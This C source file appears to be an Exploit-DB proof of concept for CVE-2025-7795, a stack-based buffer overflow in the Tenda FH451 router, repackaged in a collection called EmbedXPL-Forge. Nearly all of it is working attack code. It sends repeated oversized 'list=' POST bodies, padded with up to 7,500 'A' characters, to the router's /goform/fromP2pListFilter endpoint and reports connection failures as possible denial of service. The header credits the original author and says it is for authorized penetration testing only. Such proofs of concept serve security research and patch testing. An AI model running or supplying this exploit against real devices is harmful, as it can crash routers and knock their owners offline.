/*
 * Original source: https://www.exploit-db.com/exploits/52374
 * EDB-ID: 52374 | CVE: CVE-2025-7795
 * Original author: Byte Reaper (@ByteReaper0)
 * Date: 2025-07-22
 * Product: Tenda FH451 1.0.0.9 Router - Stack-based Buffer Overflow
 * Endpoint: POST /goform/fromP2pListFilter
 *
 * Embedded in EmbedXPL-Forge native_src by @mrhenrike | Uniao Geek.
 * The code above is the work of the original author. All original credits apply.
 * For authorized penetration testing only.
 */
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <arpa/inet.h>
#include <sys/wait.h>
#include <unistd.h>

#define FULL_URL 2500
#define POST_DATA 10000

const char *targetip = NULL;
char postData[POST_DATA];

struct Mem { char *buffer; size_t len; };

size_t write_cb(void *ptr, size_t size, size_t nmemb, void *userdata) {
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (!tmp) return 0;
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}

int main(int argc, const char **argv) {
    if (argc < 2) {
        printf("Usage: %s <target_ip>\n", argv[0]);
        return 1;
    }
    targetip = argv[1];

    CURL *c = curl_easy_init();
    if (!c) { fprintf(stderr, "curl_easy_init failed\n"); return 1; }

    char full[FULL_URL];
    snprintf(full, sizeof(full), "http://%s/goform/fromP2pListFilter", targetip);

    int rounds = 5;
    int baseLen = 3500, step = 1000;

    for (int i = 0; i < rounds; i++) {
        int len = baseLen + i * step;
        if (len + 6 >= (int)sizeof(postData)) break;
        snprintf(postData, sizeof(postData), "list=");
        memset(postData + 5, 'A', len);
        postData[5 + len] = '\0';

        struct Mem response = {NULL, 0};
        curl_easy_reset(c);
        curl_easy_setopt(c, CURLOPT_URL, full);
        curl_easy_setopt(c, CURLOPT_POST, 1L);
        curl_easy_setopt(c, CURLOPT_POSTFIELDS, postData);
        curl_easy_setopt(c, CURLOPT_POSTFIELDSIZE, (long)strlen(postData));
        curl_easy_setopt(c, CURLOPT_WRITEFUNCTION, write_cb);
        curl_easy_setopt(c, CURLOPT_WRITEDATA, &response);
        curl_easy_setopt(c, CURLOPT_CONNECTTIMEOUT, 5L);
        curl_easy_setopt(c, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(c, CURLOPT_SSL_VERIFYPEER, 0L);

        printf("[%d] Length: %d\n", i+1, len);
        CURLcode res = curl_easy_perform(c);
        if (res == CURLE_OK) {
            long httpCode = 0;
            curl_easy_getinfo(c, CURLINFO_RESPONSE_CODE, &httpCode);
            printf("HTTP %ld\n", httpCode);
        } else {
            printf("Connection failed: %s (may indicate DoS)\n", curl_easy_strerror(res));
        }
        free(response.buffer);
    }
    curl_easy_cleanup(c);
    return 0;
}